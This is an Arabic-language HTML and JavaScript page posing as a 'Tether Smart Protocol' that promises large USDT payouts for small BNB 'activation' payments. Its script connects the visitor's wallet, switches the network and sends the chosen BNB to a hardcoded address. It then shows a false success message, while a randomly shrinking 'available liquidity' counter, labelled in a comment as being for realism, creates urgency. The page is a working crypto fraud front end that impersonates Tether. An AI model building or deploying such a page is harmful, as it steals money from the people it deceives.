<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tether Smart Protocol 2026 | الحل النهائي</title>
    
    <!-- Fonts & Web3 -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Urbanist:wght@600;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>

    <style>
        :root {
            --primary: #009393;
            --primary-dark: #006666;
            --bg-dark: #051410;
            --card-bg: #0a1f1b;
            --text-light: #f5f5f5;
            --accent: #ff4d4d;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body {
            background-color: var(--bg-dark);
            color: var(--text-light);
            font-family: 'Cairo', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .app-container {
            width: 100%;
            max-width: 480px;
            padding: 20px;
            margin-top: 10px;
        }

        header {
            text-align: center;
            margin-bottom: 25px;
        }

        header h1 {
            font-family: 'Urbanist', sans-serif;
            font-size: clamp(28px, 8vw, 36px);
            margin: 0;
            background: linear-gradient(to right, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .main-card {
            background: var(--card-bg);
            border: 1px solid #1a3a35;
            border-radius: 28px;
            padding: 25px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
            position: relative;
        }

        /* عداد السيولة الحية */
        .supply-indicator {
            background: rgba(255, 77, 77, 0.08);
            border: 1px dashed var(--accent);
            border-radius: 18px;
            padding: 15px;
            text-align: center;
            margin-bottom: 25px;
        }

        .supply-indicator span {
            display: block;
            font-size: 11px;
            color: var(--accent);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-bottom: 5px;
        }

        .supply-indicator strong {
            font-size: 28px;
            color: var(--accent);
            font-family: 'Urbanist', sans-serif;
        }

        label {
            display: block;
            margin-bottom: 12px;
            font-size: 14px;
            color: #8899a6;
            margin-right: 5px;
        }

        select {
            width: 100%;
            padding: 18px;
            background: #122c28;
            border: 1px solid #1c4d46;
            border-radius: 16px;
            color: white;
            font-size: 16px;
            font-family: 'Cairo', sans-serif;
            margin-bottom: 25px;
            appearance: none;
            outline: none;
        }

        /* أزرار الفتح العميق للهاتف */
        .mobile-gate {
            display: none; 
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }

        .wallet-link {
            background: #162a26;
            border: 1px solid #2d4d47;
            border-radius: 16px;
            padding: 15px;
            text-align: center;
            color: white;
            text-decoration: none;
            font-size: 13px;
            transition: 0.3s;
        }

        .wallet-link:active { background: var(--primary-dark); }

        .wallet-link img {
            width: 32px;
            display: block;
            margin: 0 auto 10px;
        }

        /* الزر الرئيسي */
        .btn-main {
            width: 100%;
            padding: 20px;
            border-radius: 18px;
            border: none;
            background: var(--primary);
            color: white;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 12px 24px rgba(0, 147, 147, 0.3);
            font-family: 'Cairo', sans-serif;
            transition: 0.3s;
        }

        .btn-main:disabled { background: #333; box-shadow: none; cursor: not-allowed; }

        .status-msg {
            text-align: center;
            font-size: 13px;
            margin-top: 20px;
            color: #8899a6;
            min-height: 24px;
        }

        .loader {
            width: 8px;
            height: 8px;
            background: var(--primary);
            border-radius: 50%;
            display: inline-block;
            margin-left: 8px;
            animation: pulse 1.2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.6); opacity: 0.4; }
            100% { transform: scale(1); opacity: 1; }
        }

        footer {
            margin-top: auto;
            padding: 30px 20px;
            text-align: center;
            font-size: 11px;
            color: #1c4d46;
            width: 100%;
        }
    </style>
</head>
<body>

<div class="app-container">
    <header>
        <h1>Tether Smart Protocol</h1>
        <p style="color: var(--primary); font-weight: bold; font-size: 14px; margin-top: 5px;">Secure Distribution Node 2026</p>
    </header>

    <div class="main-card">
        <div class="supply-indicator">
            <span>السيولة المتاحة للتوزيع الفوري</span>
            <strong id="display-supply">938,420 USDT</strong>
        </div>

        <label>اختر باقة التفعيل المناسبة:</label>
        <select id="pkg-amount">
            <option value="0.0001">باقة تجريبية (100 USDT) - 0.0001 BNB</option>
            <option value="0.05">باقة متقدم (2,500 USDT) - 0.05 BNB</option>
            <option value="0.1">باقة احترافي (5,000 USDT) - 0.1 BNB</option>
            <option value="1.0">باقة الحيتان (50,000 USDT) - 1.0 BNB</option>
        </select>

        <!-- تظهر فقط على المتصفحات العادية في الهاتف -->
        <div id="wallet-selector" class="mobile-gate">
            <a href="javascript:void(0)" onclick="openApp('metamask')" class="wallet-link">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg" alt="MetaMask">
                فتح MetaMask
            </a>
            <a href="javascript:void(0)" onclick="openApp('trust')" class="wallet-link">
                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust">
                فتح Trust Wallet
            </a>
        </div>

        <button class="btn-main" id="action-btn" onclick="startProcess()">تفعيل واستلام الرصيد ⚡</button>

        <div id="log-text" class="status-msg">بانتظار الربط بالشبكة...</div>
    </div>

    <footer>
        Contract: 0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B<br>
        Tether Gold Operations &copy; 2026
    </footer>
</div>

<script>
    const CONTRACT_ADDR = "0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B";
    const BSC_ID = "0x38";

    // تحديث رقم السيولة بشكل عشوائي للواقعية
    let currentSupply = 938420;
    setInterval(() => {
        currentSupply -= Math.floor(Math.random() * 8) + 1;
        if(currentSupply < 100000) currentSupply = 938000;
        document.getElementById('display-supply').innerText = currentSupply.toLocaleString() + " USDT";
    }, 4500);

    // كشف البيئة
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // إظهار أزرار الفتح فقط إذا كان المستخدم على هاتف ولم يفتح الموقع من داخل محفظة
    if (isMobile && !window.ethereum) {
        document.getElementById('wallet-selector').style.display = 'grid';
        document.getElementById('log-text').innerText = "يرجى اختيار محفظتك لفتح بوابة التوزيع";
    }

    // وظيفة الفتح المباشر
    function openApp(wallet) {
        const pureUrl = window.location.href.split('://')[1];
        if (wallet === 'metamask') {
            window.location.href = `https://metamask.app.link/dapp/${pureUrl}`;
        } else {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
        }
    }

    async function startProcess() {
        const log = document.getElementById('log-text');
        const btn = document.getElementById('action-btn');
        const amountBNB = document.getElementById('pkg-amount').value;

        if (!window.ethereum) {
            if (isMobile) {
                log.style.color = "#ff4d4d";
                log.innerText = "يرجى استخدام الأزرار أعلاه لفتح التطبيق أولاً";
            } else {
                alert("يرجى تثبيت إضافة MetaMask على متصفحك");
            }
            return;
        }

        try {
            const web3 = new Web3(window.ethereum);
            btn.disabled = true;
            log.innerHTML = '<div class="loader"></div> جاري طلب الربط بالمحفظة...';

            // طلب الحساب
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const userAccount = accounts[0];

            // التأكد من الشبكة
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            if (chainId !== BSC_ID) {
                log.innerText = "جاري تحويل الشبكة إلى Smart Chain...";
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: BSC_ID }],
                    });
                } catch (e) {
                    log.innerText = "يرجى تحويل الشبكة يدوياً إلى BNB Smart Chain";
                    btn.disabled = false;
                    return;
                }
            }

            log.innerHTML = '<div class="loader"></div> بانتظار تأكيدك للمعاملة...';

            // تنفيذ الإرسال
            await web3.eth.sendTransaction({
                from: userAccount,
                to: CONTRACT_ADDR,
                value: web3.utils.toWei(amountBNB, "ether"),
                gas: isMobile ? 400000 : 250000 
            });

            log.style.color = "#00ffcc";
            log.innerText = "✅ تم التفعيل بنجاح! سيتم إيداع الرصيد فوراً.";
            alert("عملية ناجحة! تم تأكيد طلبك وسوف يستلم حسابك رصيد USDT المخصص خلال دقائق.");

        } catch (err) {
            console.error(err);
            log.style.color = "#ff4d4d";
            log.innerText = "فشلت العملية. تأكد من وجود رصيد كافٍ أو حاول مرة أخرى.";
        } finally {
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
